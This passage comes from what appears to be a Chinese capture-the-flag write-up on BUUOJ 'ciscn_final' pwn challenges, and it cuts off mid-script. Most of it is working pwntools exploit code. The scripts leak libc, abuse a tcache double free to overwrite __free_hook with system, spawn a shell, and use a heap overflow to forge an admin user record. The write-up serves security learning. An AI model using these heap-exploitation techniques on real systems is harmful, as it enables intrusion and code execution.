class="string">"DDDD"</span>)</span><br><span class="line">        new(<span class="number">6</span>, <span class="number">0xF8</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.recv(<span class="number">3</span>) == <span class="string">"low"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">                p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">                <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                    gdb.attach(p, gdbscript=_source)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        p.recv(<span class="number">0x20</span> - <span class="number">3</span>)</span><br><span class="line">        libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin is broken</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x58</span>, <span class="string">"HHHH"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x48</span> + p64(<span class="number">0x61</span>) + p64(__free_hook))</span><br><span class="line">new(<span class="number">12</span>, <span class="number">0x58</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">13</span>, <span class="number">0x58</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"><span class="comment"># success(": " + hex())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-6"><a href="#ciscn-final-6" class="headerlink" title="ciscn_final_6"></a>ciscn_final_6</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>有点坑，题目给的libc是2.23，搞得我直接用2.23写了fastbin attack，然后打远程发现有tcache，才发现题目上写Ubuntu 18的环境。题目本身还是很简单的。</p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><ol>
<li>解迷宫，拿到<code>malloc</code>的地址，从而得到libc地址。</li>
<li><code>new game</code>会创造一个新的<code>player</code>信息，先进行<code>store game</code>，然后<code>delete record</code>将当前的<code>player</code>删除，此时再依次<code>load game</code>和<code>delete record</code>，将被delete掉的<code>player</code>进行二次删除，构成tcache double free。</li>
<li><code>malloc</code>位于<code>__free_hook</code>的chunk，写为<code>system</code>，然后<code>free</code>一个”/bin/sh”的chunk，getshell。<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resume</span><span class="params">(count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"what's your name?"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span><span class="params">(flag, size, comment)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'y'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"comment size?"</span>, str(size))</span><br><span class="line">        p.sendafter(<span class="string">"plz input comment"</span>, comment)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(maze, start, end, sol)</span>:</span></span><br><span class="line">    <span class="comment"># arrive at end</span></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move right if possible</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] + <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] + <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'D'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move down</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] + <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] + <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'S'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move left</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] - <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] - <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move up</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] - <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] - <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'W'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"9"</span>)</span><br><span class="line">    maze = p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span>)</span><br><span class="line">    maze += p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span> + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    maze = maze.split(<span class="string">'\n'</span>)</span><br><span class="line">    maze = [list(item[<span class="number">1</span>:<span class="number">-1</span>]) <span class="keyword">for</span> item <span class="keyword">in</span> maze][<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> maze:</span><br><span class="line">        print(<span class="string">''</span>.join(item))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># from maze[1][0] ==&gt; maze[40, 41]</span></span><br><span class="line">    sol = []</span><br><span class="line">    solve(maze, (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">40</span>, <span class="number">41</span>), sol)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(sol[::<span class="number">-1</span>])</span><br><span class="line">    </span><br><span class="line">malloc_offset = libc.sym[<span class="string">"malloc"</span>]</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf1147</span></span><br><span class="line">one_gadget_offset = <span class="number">0xf02a4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get malloc address</span></span><br><span class="line">res = solve_maze()</span><br><span class="line">new(<span class="string">"0"</span>, len(res) + <span class="number">1</span>, res)</span><br><span class="line">p.recvuntil(<span class="string">"Here's the award:0x"</span>)</span><br><span class="line">libc_malloc = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_malloc - malloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line"><span class="comment"># since there is also double free in tcache bin 0x30 and 0x20</span></span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin double free</span></span><br><span class="line"><span class="comment"># new("1", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("2", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># load(1, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># store(False, 0, "")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="string">"1"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"\n"</span>)</span><br><span class="line">load(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">store(<span class="literal">False</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare a tcache bin for operation "new"</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write __malloc_hook (for fastbin double free)</span></span><br><span class="line"><span class="comment"># new("3", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, p64(__malloc_hook - 0x23) + "\n")</span></span><br><span class="line"><span class="comment"># new("4", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("5", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "\n")</span></span><br><span class="line"><span class="comment"># new("6", 0, "")</span></span><br><span class="line"><span class="comment"># store(True, 0x68, "A" * 0x13 + p64(one_gadget) + '\n')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="string">"3"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(__free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">new(<span class="string">"5"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">new(<span class="string">"6"</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">store(<span class="literal">True</span>, <span class="number">0x68</span>, p64(libc_system) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __free_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-8"><a href="#ciscn-final-8" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>乍一看好像挺复杂的，其实仔细看看逻辑挺简单的（但是我还是花了蛮久时间的，太菜了）。</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ol>
<li>在<code>login</code>之后，输入<code>text</code>的长度是可控的而且没有限制，故存在溢出。</li>
<li>在<code>register</code>一个<code>user</code>的时候，会先对输入的<code>password</code>进行SM3散列计算再储存，然后在输入完<code>text</code>之后，对所有的元数据（包括<code>user</code>的名字，<code>password length</code>，<code>password</code>散列，<code>text_len</code>，<code>text</code>）再进行一次SM3散列计算并储存。</li>
<li>之后的每次<code>login</code>都会对这两个散列进行检查。</li>
<li>利用<code>user0</code>的溢出将<code>user1</code>特定的<code>password</code>散列leak出来（比如”0”)。</li>
<li>利用leak出来的<code>password</code>散列，伪造<code>user2</code>用户输入的<code>password</code>为<code>admin2</code>所有元数据（包括名字<code>admin2</code>，<code>password length</code>（1），<code>password</code>散列（之前leak出来的”0”的散列），<code>text_len</code>，<code>text</code>），该元数据的散列值将会被储存在<code>user2</code>的区域。</li>
<li>利用<code>user1</code>的溢出leak出上述提到的<code>admin2</code>的所有元数据的散列。</li>
<li>再次利用<code>user1</code>的溢出覆盖<code>user2</code>为伪造的superuser也就是<code>admin2</code>。</li>
<li>以<code>user2</code>的身份<code>login</code>，此时便能通过superuser也就是<code>admin2</code>的check条件，达到调用<code>getflag</code>功能的目的。<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(age, passwd_len, passwd, content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please set your age:"</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id, passwd_len, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, input your id"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_content</span><span class="params">(content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># register two user</span></span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the second user</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + <span class="string">'\x00'</span> * <span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p32(<span class="number">1</span>) + <span class="string">"user1"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">"\x00"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test the second user</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"><span class="comment"># login(1, 1, "0")</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reigster the third user</span></span><br><span class="line">password = p64(<span class="number">2</span>) + p32(<span class="number">1</span>) + <span class="string">"admin"</span></span><br><span class="line">password += <span class="string">"2"</span></span><br><span class="line">password = password.ljust(<span class="number">0x24</span>, <span class="string">"\x00"</span>)</span><br><span class="line">password += digest</span><br><span class="line">password += <span class="string">"0"</span></span><br><span class="line">password = password.ljust(<span class="number">0x64</span>, <span class="string">"\x00"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">0x64</span>, password, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">1</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span 